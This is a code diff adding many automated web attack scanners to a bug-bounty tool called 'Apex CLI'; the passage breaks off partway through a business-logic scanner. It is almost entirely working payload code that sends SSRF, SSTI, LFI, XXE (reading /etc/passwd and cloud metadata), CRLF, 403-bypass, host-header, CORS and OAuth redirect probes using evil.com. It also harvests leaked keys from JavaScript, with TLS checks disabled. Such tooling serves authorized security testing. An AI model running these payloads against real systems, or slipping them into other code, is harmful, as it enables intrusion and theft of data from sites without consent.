@@ -1,4 +1,4 @@
-"""Apex CLI v3.0 — Built-in scanners (no external tool dependencies)."""
+"""Apex CLI v5.0 — Built-in scanners (no external tool dependencies)."""
 
 import re
 import time
@@ -10,7 +10,7 @@ from bs4 import BeautifulSoup
 
 requests.packages.urllib3.disable_warnings()
 _S = requests.Session()
-_S.headers.update({"User-Agent": "ApexCLI/3.0"})
+_S.headers.update({"User-Agent": "ApexCLI/5.0"})
 _S.verify = False
 _TIMEOUT = 10
 
@@ -591,4 +591,3083 @@ def scan_sensitive_files(base_url):
         except Exception:
             continue
 
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Advanced scanners — find real bugs that pay bounties
+# ---------------------------------------------------------------------------
+
+def scan_ssrf(crawl_data):
+    """Test for Server-Side Request Forgery."""
+    findings = []
+    canary = "http://169.254.169.254/latest/meta-data/"
+    canary2 = "http://127.0.0.1:22"
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload in [canary, canary2, "http://[::1]", "file:///etc/passwd"]:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT, allow_redirects=False)
+                    if any(x in r.text.lower() for x in ["ami-id", "instance-id", "ssh-", "root:", "meta-data"]):
+                        findings.append({"type": "SSRF", "severity": "critical", "url": test_url,
+                                         "detail": f"SSRF via param {p}", "template": "apex-ssrf"})
+                        break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_ssti(crawl_data):
+    """Test for Server-Side Template Injection."""
+    findings = []
+    payloads = [("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"), ("#{7*7}", "49"), ("{{config}}", "SECRET_KEY")]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload, expect in payloads:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    if expect in r.text and payload not in r.text:
+                        findings.append({"type": "SSTI (Server-Side Template Injection)", "severity": "critical",
+                                         "url": test_url, "detail": f"SSTI via {p}: {payload} → {expect}",
+                                         "template": "apex-ssti"})
+                        break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_path_traversal(crawl_data):
+    """Test for path traversal / LFI."""
+    findings = []
+    payloads = ["....//....//....//....//etc/passwd", "..%2f..%2f..%2f..%2fetc/passwd",
+                "....//....//....//....//windows/win.ini", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
+    markers = ["root:x:", "root:*:", "[fonts]", "daemon:"]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload in payloads:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    if any(m in r.text for m in markers):
+                        findings.append({"type": "Path Traversal / LFI", "severity": "critical",
+                                         "url": test_url, "detail": f"LFI via {p}", "template": "apex-lfi"})
+                        break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_broken_auth(crawl_data):
+    """Test for broken authentication — accessible admin/API endpoints."""
+    findings = []
+    admin_paths = ["/admin", "/admin/dashboard", "/api/admin", "/api/users", "/api/v1/users",
+                   "/graphql", "/api/config", "/debug", "/actuator", "/actuator/env",
+                   "/swagger-ui.html", "/api-docs", "/.well-known/openid-configuration",
+                   "/wp-json/wp/v2/users", "/api/v1/admin", "/internal", "/management"]
+    for target in crawl_data.get("pages", [])[:3]:
+        base = target["url"].split("/", 3)
+        if len(base) >= 3:
+            base_url = "/".join(base[:3])
+        else:
+            continue
+        # Get baseline 404
+        try:
+            r404 = _S.get(f"{base_url}/nonexistent_test_8374xyz", timeout=5)
+            size_404 = len(r404.content)
+        except Exception:
+            continue
+        for path in admin_paths:
+            try:
+                r = _S.get(f"{base_url}{path}", timeout=5, allow_redirects=False)
+                if r.status_code == 200 and abs(len(r.content) - size_404) > 100:
+                    body = r.text[:500].lower()
+                    # Check for real content indicators
+                    if any(x in body for x in ["admin", "dashboard", "user", "config", "swagger",
+                                                "graphql", "query", "schema", "endpoint", "api",
+                                                "token", "secret", "password", "email"]):
+                        findings.append({"type": f"Exposed Endpoint: {path}", "severity": "high",
+                                         "url": f"{base_url}{path}",
+                                         "detail": f"Accessible without auth ({r.status_code}, {len(r.content)}b)",
+                                         "template": "apex-auth"})
+            except Exception:
+                continue
+    return findings
+
+
+def scan_cors(crawl_data):
+    """Test for CORS misconfiguration."""
+    findings = []
+    tested = set()
+    for target in crawl_data.get("pages", [])[:10]:
+        url = target["url"]
+        base = "/".join(url.split("/", 3)[:3])
+        if base in tested:
+            continue
+        tested.add(base)
+        for origin in ["https://evil.com", "null", f"{base}.evil.com"]:
+            try:
+                r = _S.get(url, timeout=5, headers={"Origin": origin})
+                acao = r.headers.get("Access-Control-Allow-Origin", "")
+                acac = r.headers.get("Access-Control-Allow-Credentials", "")
+                if acao == origin and acac.lower() == "true":
+                    findings.append({"type": "CORS Misconfiguration", "severity": "high",
+                                     "url": url, "detail": f"Reflects origin {origin} with credentials",
+                                     "template": "apex-cors"})
+                    break
+            except Exception:
+                continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# More advanced scanners — high-value bug classes
+# ---------------------------------------------------------------------------
+
+def scan_prototype_pollution(crawl_data):
+    """Test for prototype pollution via query params."""
+    findings = []
+    for target in crawl_data.get("pages", [])[:5]:
+        url = target["url"].split("?")[0]
+        try:
+            payload_url = f"{url}?__proto__[test]=polluted&constructor[prototype][test]=polluted"
+            r = _S.get(payload_url, timeout=_TIMEOUT)
+            if "polluted" in r.text and "__proto__" not in r.text:
+                findings.append({"type": "Prototype Pollution", "severity": "high", "url": payload_url,
+                                 "detail": "Reflected prototype pollution", "template": "apex-pp"})
+        except: pass
+    return findings
+
+
+def scan_host_header_injection(crawl_data):
+    """Test for host header injection."""
+    findings = []
+    tested = set()
+    for target in crawl_data.get("pages", [])[:5]:
+        base = "/".join(target["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            r = _S.get(target["url"], timeout=_TIMEOUT, headers={"Host": "evil.com"}, allow_redirects=False)
+            if "evil.com" in r.text or "evil.com" in r.headers.get("Location", ""):
+                findings.append({"type": "Host Header Injection", "severity": "high", "url": target["url"],
+                                 "detail": "Host header reflected/used in redirect", "template": "apex-hhi"})
+        except: pass
+        try:
+            r = _S.get(target["url"], timeout=_TIMEOUT, headers={"X-Forwarded-Host": "evil.com"}, allow_redirects=False)
+            if "evil.com" in r.text or "evil.com" in r.headers.get("Location", ""):
+                findings.append({"type": "Host Header Injection (X-Forwarded-Host)", "severity": "high",
+                                 "url": target["url"], "detail": "X-Forwarded-Host reflected", "template": "apex-hhi"})
+        except: pass
+    return findings
+
+
+def scan_crlf_injection(crawl_data):
+    """Test for CRLF injection in headers."""
+    findings = []
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            try:
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[p] = ["test%0d%0aX-Injected: true"]
+                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                r = _S.get(test_url, timeout=_TIMEOUT, allow_redirects=False)
+                if "X-Injected" in str(r.headers):
+                    findings.append({"type": "CRLF Injection", "severity": "high", "url": test_url,
+                                     "detail": f"Header injection via {p}", "template": "apex-crlf"})
+                    break
+            except: continue
+    return findings
+
+
+def scan_jwt_issues(crawl_data):
+    """Check for JWT misconfigurations."""
+    findings = []
+    tested = set()
+    for target in crawl_data.get("pages", [])[:5]:
+        base = "/".join(target["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        # Check common JWT endpoints
+        for path in ["/api/auth", "/api/login", "/auth/token", "/oauth/token", "/api/v1/auth"]:
+            try:
+                r = _S.post(f"{base}{path}", json={"username":"test","password":"test"}, timeout=5)
+                body = r.text
+                # Check if response contains a JWT
+                import re as _re
+                jwts = _re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', body)
+                if jwts:
+                    # Try none algorithm
+                    import base64
+                    for jwt in jwts:
+                        parts = jwt.split(".")
+                        try:
+                            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
+                            if header.get("alg") == "none" or header.get("alg") == "HS256":
+                                findings.append({"type": "JWT Weak Algorithm", "severity": "high",
+                                                 "url": f"{base}{path}", "detail": f"JWT uses {header.get('alg')}",
+                                                 "template": "apex-jwt"})
+                        except: pass
+            except: continue
+    return findings
+
+
+def scan_subdomain_takeover(subdomains):
+    """Check for subdomain takeover opportunities."""
+    findings = []
+    takeover_sigs = {
+        "There isn't a GitHub Pages site here": "GitHub Pages",
+        "NoSuchBucket": "AWS S3",
+        "No such app": "Heroku",
+        "NXDOMAIN": "Unclaimed",
+        "The request could not be satisfied": "CloudFront",
+        "Repository not found": "Bitbucket",
+        "Sorry, this shop is currently unavailable": "Shopify",
+        "The feed has not been found": "Feedpress",
+        "project not found": "Surge.sh",
+        "Fastly error: unknown domain": "Fastly",
+    }
+    for sub in subdomains[:50]:
+        for proto in ["https", "http"]:
+            try:
+                r = requests.get(f"{proto}://{sub}", timeout=5, verify=False, allow_redirects=True)
+                for sig, service in takeover_sigs.items():
+                    if sig in r.text:
+                        findings.append({"type": f"Subdomain Takeover ({service})", "severity": "critical",
+                                         "url": f"{proto}://{sub}", "detail": f"Dangling CNAME → {service}",
+                                         "template": "apex-takeover"})
+                        break
+                break
+            except requests.exceptions.ConnectionError:
+                # NXDOMAIN or connection refused — check DNS
+                try:
+                    import socket
+                    socket.getaddrinfo(sub, None)
+                except socket.gaierror:
+                    # Check if CNAME exists
+                    try:
+                        result = subprocess.run(["dig", "+short", "CNAME", sub], capture_output=True, text=True, timeout=5)
+                        cname = result.stdout.strip()
+                        if cname and not cname.endswith(sub.split(".")[-2] + "."):
+                            findings.append({"type": "Potential Subdomain Takeover", "severity": "high",
+                                             "url": sub, "detail": f"CNAME {cname} but host unreachable",
+                                             "template": "apex-takeover"})
+                    except: pass
+                break
+            except: break
+    return findings
+
+
+import json as json
+import subprocess
+
+
+# ---------------------------------------------------------------------------
+# Elite scanners — the stuff that wins big bounties
+# ---------------------------------------------------------------------------
+
+def scan_api_keys_in_js(crawl_data):
+    """Scan JavaScript files for leaked API keys, tokens, secrets."""
+    findings = []
+    patterns = {
+        "AWS Key": r"AKIA[0-9A-Z]{16}",
+        "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
+        "Slack Token": r"xox[bpors]-[0-9a-zA-Z]{10,48}",
+        "GitHub Token": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
+        "Private Key": r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
+        "Stripe Key": r"sk_live_[0-9a-zA-Z]{24,}",
+        "Twilio": r"SK[0-9a-fA-F]{32}",
+        "Mailgun": r"key-[0-9a-zA-Z]{32}",
+        "Firebase": r"AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}",
+        "JWT Secret": r"['\"]?(?:jwt|JWT|secret|SECRET|api[_-]?key|API[_-]?KEY|token|TOKEN)['\"]?\s*[:=]\s*['\"][A-Za-z0-9+/=_-]{16,}['\"]",
+        "Password in Code": r"['\"]?(?:password|passwd|pwd)['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]",
+        "Internal URL": r"https?://(?:localhost|127\.0\.0\.1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)[:/][^\s'\"]+",
+    }
+    js_urls = set()
+    for page in crawl_data.get("pages", []):
+        try:
+            r = _S.get(page["url"], timeout=_TIMEOUT)
+            soup = BeautifulSoup(r.text, "lxml")
+            for script in soup.find_all("script", src=True):
+                src = script["src"]
+                if src.startswith("//"):
+                    src = "https:" + src
+                elif src.startswith("/"):
+                    base = "/".join(page["url"].split("/", 3)[:3])
+                    src = base + src
+                if src.startswith("http"):
+                    js_urls.add(src)
+        except: pass
+    for js_url in list(js_urls)[:30]:
+        try:
+            r = _S.get(js_url, timeout=_TIMEOUT)
+            if len(r.content) > 5_000_000: continue
+            for name, pattern in patterns.items():
+                matches = re.findall(pattern, r.text)
+                if matches:
+                    sample = matches[0][:60] if isinstance(matches[0], str) else str(matches[0])[:60]
+                    findings.append({"type": f"Leaked Secret: {name}", "severity": "critical",
+                                     "url": js_url, "detail": f"Found: {sample}...",
+                                     "template": "apex-secrets"})
+        except: pass
+    return findings
+
+
+def scan_graphql(crawl_data):
+    """Find and test GraphQL endpoints for introspection and injection."""
+    findings = []
+    tested = set()
+    gql_paths = ["/graphql", "/graphql/v1", "/api/graphql", "/gql", "/query", "/graphiql"]
+    introspection = {"query": "{__schema{types{name fields{name}}}}"}
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in gql_paths:
+            try:
+                r = _S.post(f"{base}{path}", json=introspection, timeout=5,
+                           headers={"Content-Type": "application/json"})
+                if "__schema" in r.text and "types" in r.text:
+                    data = r.json()
+                    type_names = [t["name"] for t in data.get("data",{}).get("__schema",{}).get("types",[])
+                                  if not t["name"].startswith("__")]
+                    sensitive = [t for t in type_names if any(x in t.lower() for x in
+                                ["user","admin","auth","token","secret","password","payment","order","credit"])]
+                    findings.append({"type": "GraphQL Introspection Enabled", "severity": "high",
+                                     "url": f"{base}{path}",
+                                     "detail": f"{len(type_names)} types exposed. Sensitive: {', '.join(sensitive[:5])}",
+                                     "template": "apex-graphql"})
+                    break
+            except: continue
+    return findings
+
+
+def scan_rate_limit(crawl_data):
+    """Check for missing rate limiting on auth endpoints."""
+    findings = []
+    tested = set()
+    auth_paths = ["/login", "/api/login", "/auth", "/api/auth", "/signin", "/api/signin",
+                  "/forgot-password", "/api/forgot-password", "/reset-password", "/api/v1/login"]
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in auth_paths:
+            url = f"{base}{path}"
+            try:
+                blocked = False
+                for i in range(15):
+                    r = _S.post(url, json={"email":"test@test.com","password":"wrong"}, timeout=3)
+                    if r.status_code == 429 or "rate" in r.text.lower() or "too many" in r.text.lower():
+                        blocked = True
+                        break
+                if not blocked:
+                    # Verify endpoint exists (not just 404)
+                    if r.status_code < 404:
+                        findings.append({"type": "Missing Rate Limit", "severity": "medium",
+                                         "url": url, "detail": f"No rate limit after 15 requests ({r.status_code})",
+                                         "template": "apex-ratelimit"})
+            except: continue
+    return findings
+
+
+def scan_websocket(crawl_data):
+    """Find WebSocket endpoints and check for auth issues."""
+    findings = []
+    for page in crawl_data.get("pages", [])[:10]:
+        try:
+            r = _S.get(page["url"], timeout=_TIMEOUT)
+            ws_urls = re.findall(r'wss?://[^\s\'"<>]+', r.text)
+            for ws in ws_urls:
+                findings.append({"type": "WebSocket Endpoint Found", "severity": "low",
+                                 "url": ws, "detail": f"Found in {page['url'][:60]}",
+                                 "template": "apex-ws"})
+        except: pass
+    return findings
+
+
+def scan_info_disclosure(crawl_data):
+    """Check for information disclosure in error pages and headers."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        # Trigger errors
+        error_urls = [f"{base}/'", f"{base}/{{{{", f"{base}/%00", f"{base}/..;/"]
+        for url in error_urls:
+            try:
+                r = _S.get(url, timeout=5)
+                body = r.text.lower()
+                if any(x in body for x in ["stack trace", "traceback", "exception in", "syntax error",
+                                            "fatal error", "debug mode", "django debug",
+                                            "laravel", "at /var/www", "at /home/", "at c:\\"]):
+                    findings.append({"type": "Debug/Stack Trace Exposed", "severity": "medium",
+                                     "url": url, "detail": "Error page leaks internal info",
+                                     "template": "apex-info"})
+                    break
+            except: continue
+        # Check headers for version disclosure
+        try:
+            r = _S.get(base, timeout=5)
+            for h in ["X-Powered-By", "Server", "X-AspNet-Version", "X-AspNetMvc-Version"]:
+                v = r.headers.get(h, "")
+                if v and any(c.isdigit() for c in v):
+                    findings.append({"type": f"Version Disclosure: {h}", "severity": "low",
+                                     "url": base, "detail": f"{h}: {v}", "template": "apex-info"})
+        except: pass
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# JavaScript endpoint extraction + hidden API testing
+# ---------------------------------------------------------------------------
+
+def extract_js_endpoints(crawl_data):
+    """Extract hidden API endpoints from JavaScript files and test them."""
+    findings = []
+    js_urls = set()
+    base_url = None
+
+    for page in crawl_data.get("pages", [])[:5]:
+        if not base_url:
+            base_url = "/".join(page["url"].split("/", 3)[:3])
+        try:
+            r = _S.get(page["url"], timeout=_TIMEOUT)
+            soup = BeautifulSoup(r.text, "lxml")
+            for s in soup.find_all("script", src=True):
+                src = s["src"]
+                if src.startswith("//"): src = "https:" + src
+                elif src.startswith("/"): src = base_url + src
+                elif not src.startswith("http"): src = base_url + "/" + src
+                js_urls.add(src)
+            # Inline scripts too
+            for s in soup.find_all("script", src=False):
+                if s.string and len(s.string) > 100:
+                    _extract_from_js(s.string, base_url, findings)
+        except: pass
+
+    # Fetch and parse external JS
+    for js_url in list(js_urls)[:20]:
+        try:
+            r = _S.get(js_url, timeout=_TIMEOUT)
+            if len(r.content) > 5_000_000: continue
+            _extract_from_js(r.text, base_url, findings)
+        except: pass
+
+    # Deduplicate and test discovered endpoints
+    seen = set()
+    tested_findings = []
+    for f in findings:
+        if f["url"] not in seen:
+            seen.add(f["url"])
+            tested_findings.append(f)
+
+    return tested_findings
+
+
+def _extract_from_js(js_text, base_url, findings):
+    """Extract endpoints from JS source and test them."""
+    # Find API paths
+    api_patterns = [
+        re.compile(r'["\'](/api/[a-zA-Z0-9/_\-\.]+)["\']'),
+        re.compile(r'["\'](/v[0-9]+/[a-zA-Z0-9/_\-\.]+)["\']'),
+        re.compile(r'["\'](/graphql[a-zA-Z0-9/_\-\.]*)["\']'),
+        re.compile(r'["\'](/internal/[a-zA-Z0-9/_\-\.]+)["\']'),
+        re.compile(r'["\'](/admin/[a-zA-Z0-9/_\-\.]+)["\']'),
+        re.compile(r'["\'](/debug/[a-zA-Z0-9/_\-\.]+)["\']'),
+        re.compile(r'["\'](/private/[a-zA-Z0-9/_\-\.]+)["\']'),
+        re.compile(r'fetch\(["\']([^"\']+)["\']'),
+        re.compile(r'axios\.[a-z]+\(["\']([^"\']+)["\']'),
+        re.compile(r'\.ajax\(\{[^}]*url:\s*["\']([^"\']+)["\']'),
+        re.compile(r'XMLHttpRequest[^;]*open\([^,]*,\s*["\']([^"\']+)["\']'),
+    ]
+
+    endpoints = set()
+    for pattern in api_patterns:
+        for match in pattern.findall(js_text):
+            if match.startswith("/") and len(match) > 3 and not match.endswith((".js", ".css", ".png", ".jpg", ".svg")):
+                endpoints.add(match)
+            elif match.startswith("http") and "/api" in match:
+                endpoints.add(match)
+
+    # Test each discovered endpoint
+    for ep in list(endpoints)[:30]:
+        url = ep if ep.startswith("http") else f"{base_url}{ep}"
+        try:
+            r = _S.get(url, timeout=5, allow_redirects=False)
+            if r.status_code == 200:
+                body = r.text[:500].lower()
+                ctype = r.headers.get("content-type", "").lower()
+                # Real API response (JSON, not HTML error page)
+                if "application/json" in ctype or (body.startswith("{") or body.startswith("[")):
+                    try:
+                        data = r.json()
+                        # Check if it returns actual data without auth
+                        if isinstance(data, (dict, list)) and len(str(data)) > 20:
+                            has_sensitive = any(k in str(data).lower() for k in
+                                              ["email", "user", "token", "password", "secret", "key",
+                                               "admin", "phone", "address", "ssn", "credit"])
+                            if has_sensitive:
+                                findings.append({"type": "Unauthenticated API with Sensitive Data",
+                                                 "severity": "critical", "url": url,
+                                                 "detail": f"Returns JSON with sensitive fields ({len(str(data))}b)",
+                                                 "template": "apex-hidden-api"})
+                            else:
+                                findings.append({"type": "Hidden API Endpoint (No Auth)",
+                                                 "severity": "medium", "url": url,
+                                                 "detail": f"Accessible API found in JS ({len(str(data))}b)",
+                                                 "template": "apex-hidden-api"})
+                    except: pass
+        except: pass
+
+    # Find hardcoded config objects
+    config_patterns = [
+        re.compile(r'(?:config|CONFIG|env|ENV)\s*[=:]\s*\{([^}]{50,500})\}'),
+        re.compile(r'(?:firebase|FIREBASE)[^{]*\{([^}]{30,300})\}'),
+    ]
+    for pattern in config_patterns:
+        for match in pattern.findall(js_text):
+            if any(x in match.lower() for x in ["key", "secret", "token", "password", "apikey"]):
+                findings.append({"type": "Hardcoded Config in JS", "severity": "high",
+                                 "url": base_url, "detail": f"Config: {match[:100]}...",
+                                 "template": "apex-secrets"})
+
+
+# ---------------------------------------------------------------------------
+# Wayback Machine recon + parameter bruteforce + 403 bypass
+# ---------------------------------------------------------------------------
+
+def scan_wayback(target):
+    """Pull old URLs from Wayback Machine — find forgotten endpoints."""
+    findings = []
+    try:
+        r = requests.get(f"https://web.archive.org/cdx/search/cdx?url=*.{target}/*&output=text&fl=original&collapse=urlkey&limit=500", timeout=15)
+        urls = set()
+        for line in r.text.splitlines():
+            line = line.strip()
+            if any(x in line for x in [".js", ".json", "/api/", "/admin", "/internal", "/debug",
+                                        "/config", "/backup", "/test", "/staging", "/dev",
+                                        ".env", ".git", "token", "auth", "graphql", "swagger"]):
+                urls.add(line)
+        # Test if old URLs still work
+        for url in list(urls)[:40]:
+            try:
+                resp = _S.get(url, timeout=5, allow_redirects=False)
+                if resp.status_code == 200 and len(resp.content) > 50:
+                    ctype = resp.headers.get("content-type", "").lower()
+                    if "json" in ctype or "javascript" in ctype or "text/plain" in ctype:
+                        findings.append({"type": "Wayback: Forgotten Endpoint", "severity": "high",
+                                         "url": url, "detail": f"Old URL still live ({resp.status_code}, {len(resp.content)}b)",
+                                         "template": "apex-wayback"})
+                    elif any(x in url.lower() for x in [".env", "config", "admin", "debug", "backup", "token"]):
+                        findings.append({"type": "Wayback: Sensitive Path", "severity": "medium",
+                                         "url": url, "detail": f"Historical sensitive URL still responds",
+                                         "template": "apex-wayback"})
+            except: continue
+    except: pass
+    return findings
+
+
+def scan_param_bruteforce(crawl_data):
+    """Bruteforce hidden parameters on endpoints."""
+    findings = []
+    params = ["id", "user_id", "uid", "admin", "debug", "test", "token", "api_key", "key",
+              "secret", "password", "redirect", "url", "next", "return", "callback", "jsonp",
+              "file", "path", "dir", "page", "template", "include", "lang", "action", "cmd",
+              "exec", "query", "search", "email", "username", "role", "type", "format", "output",
+              "v", "version", "access_token", "auth", "session", "internal", "source", "ref"]
+
+    for page in crawl_data.get("pages", [])[:5]:
+        url = page["url"].split("?")[0]
+        try:
+            baseline = _S.get(url, timeout=5)
+            base_len = len(baseline.content)
+        except: continue
+
+        for p in params:
+            try:
+                r = _S.get(f"{url}?{p}=1", timeout=3)
+                diff = abs(len(r.content) - base_len)
+                if diff > 100 and r.status_code == 200:
+                    # Check if param actually does something
+                    r2 = _S.get(f"{url}?{p}=../../etc/passwd", timeout=3)
+                    r3 = _S.get(f"{url}?{p}=<script>x</script>", timeout=3)
+                    if "root:" in r2.text:
+                        findings.append({"type": f"Hidden Param LFI: {p}", "severity": "critical",
+                                         "url": f"{url}?{p}=../../etc/passwd",
+                                         "detail": f"Param {p} vulnerable to LFI", "template": "apex-param"})
+                    elif "<script>x</script>" in r3.text:
+                        findings.append({"type": f"Hidden Param XSS: {p}", "severity": "high",
+                                         "url": f"{url}?{p}=<script>x</script>",
+                                         "detail": f"Param {p} reflects input (XSS)", "template": "apex-param"})
+                    elif diff > 500:
+                        findings.append({"type": f"Hidden Parameter: {p}", "severity": "low",
+                                         "url": f"{url}?{p}=1",
+                                         "detail": f"Param changes response by {diff}b", "template": "apex-param"})
+            except: continue
+    return findings
+
+
+def scan_403_bypass(crawl_data):
+    """Try to bypass 403 forbidden pages."""
+    findings = []
+    forbidden = []
+    tested = set()
+
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/admin", "/api/admin", "/internal", "/debug", "/management", "/console",
+                     "/actuator", "/swagger", "/graphql", "/api/v1/users"]:
+            try:
+                r = _S.get(f"{base}{path}", timeout=3)
+                if r.status_code == 403:
+                    forbidden.append((base, path))
+            except: pass
+
+    bypasses = [
+        lambda b,p: _S.get(f"{b}{p}/", timeout=3),
+        lambda b,p: _S.get(f"{b}{p}..;/", timeout=3),
+        lambda b,p: _S.get(f"{b}{p}%2e/", timeout=3),
+        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Original-URL": p}),
+        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Rewrite-URL": p}),
+        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Forwarded-For": "127.0.0.1"}),
+        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Custom-IP-Authorization": "127.0.0.1"}),
+        lambda b,p: _S.get(f"{b}/{p.lstrip('/')}", timeout=3, headers={"Content-Length": "0"}, allow_redirects=False),
+        lambda b,p: _S.get(f"{b}{p}%00", timeout=3),
+        lambda b,p: _S.get(f"{b}{p}#", timeout=3),
+        lambda b,p: _S.get(f"{b}{p}?", timeout=3),
+    ]
+
+    for base, path in forbidden[:10]:
+        for i, bypass in enumerate(bypasses):
+            try:
+                r = bypass(base, path)
+                if r.status_code == 200 and len(r.content) > 100:
+                    findings.append({"type": f"403 Bypass: {path}", "severity": "high",
+                                     "url": f"{base}{path}", "detail": f"Bypass method #{i+1} returned 200",
+                                     "template": "apex-403bypass"})
+                    break
+            except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# OAuth/SSO, XXE, Deserialization, Business Logic
+# ---------------------------------------------------------------------------
+
+def scan_oauth_issues(crawl_data):
+    """Test OAuth/SSO flows for common misconfigurations."""
+    findings = []
+    tested = set()
+    oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth", "/connect/authorize",
+                   "/login/oauth", "/sso", "/saml/login", "/.well-known/openid-configuration"]
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in oauth_paths:
+            try:
+                r = _S.get(f"{base}{path}", timeout=5, allow_redirects=False)
+                if r.status_code in (200, 302):
+                    loc = r.headers.get("Location", "")
+                    # Check for open redirect in redirect_uri
+                    if "redirect_uri" in loc or "redirect_uri" in r.text:
+                        test = f"{base}{path}?client_id=test&redirect_uri=https://evil.com&response_type=code"
+                        r2 = _S.get(test, timeout=5, allow_redirects=False)
+                        if "evil.com" in r2.headers.get("Location", ""):
+                            findings.append({"type": "OAuth Open Redirect", "severity": "critical",
+                                             "url": test, "detail": "redirect_uri not validated",
+                                             "template": "apex-oauth"})
+                    # Check for state param missing (CSRF)
+                    if "code=" in loc and "state=" not in loc:
+                        findings.append({"type": "OAuth Missing State (CSRF)", "severity": "high",
+                                         "url": f"{base}{path}", "detail": "No state param = CSRF possible",
+                                         "template": "apex-oauth"})
+                    if r.status_code == 200:
+                        findings.append({"type": f"OAuth Endpoint Found: {path}", "severity": "low",
+                                         "url": f"{base}{path}", "detail": "OAuth endpoint accessible",
+                                         "template": "apex-oauth"})
+            except: continue
+    return findings
+
+
+def scan_xxe(crawl_data):
+    """Test XML endpoints for XXE injection."""
+    findings = []
+    xxe_payload = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"""
+    xxe_ssrf = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>"""
+
+    for page in crawl_data.get("pages", [])[:5]:
+        url = page["url"]
+        # Test forms that might accept XML
+        for form in crawl_data.get("forms", []):
+            if form.get("method", "").upper() == "POST":
+                action = form.get("action", url)
+                if not action.startswith("http"):
+                    base = "/".join(url.split("/", 3)[:3])
+                    action = base + action
+                try:
+                    r = _S.post(action, data=xxe_payload,
+                               headers={"Content-Type": "application/xml"}, timeout=5)
+                    if "root:" in r.text or "daemon:" in r.text:
+                        findings.append({"type": "XXE Injection", "severity": "critical",
+                                         "url": action, "detail": "XXE reads /etc/passwd",
+                                         "template": "apex-xxe"})
+                    elif "ami-id" in r.text or "instance-id" in r.text:
+                        findings.append({"type": "XXE SSRF (Cloud Metadata)", "severity": "critical",
+                                         "url": action, "detail": "XXE reaches cloud metadata",
+                                         "template": "apex-xxe"})
+                except: pass
+        # Test JSON endpoints that might also accept XML
+        for path in ["/api/upload", "/api/import", "/api/parse", "/api/xml", "/upload"]:
+            base = "/".join(url.split("/", 3)[:3])
+            try:
+                r = _S.post(f"{base}{path}", data=xxe_payload,
+                           headers={"Content-Type": "application/xml"}, timeout=5)
+                if "root:" in r.text or "ami-id" in r.text:
+                    findings.append({"type": "XXE Injection", "severity": "critical",
+                                     "url": f"{base}{path}", "detail": "XXE confirmed",
+                                     "template": "apex-xxe"})
+            except: pass
+    return findings
+
+
+def scan_business_logic(crawl_data):
+    """Test for business logic vulnerabilities — price manipulation, negative values, etc."""
+    findings = []
+    for page in crawl_data.get("pages", []):
+        url = page["url"]
+        # Look for price/quantity/amount params
+        for param, val in urllib.parse.parse_qs(urllib.parse.urlparse(url).query).items():
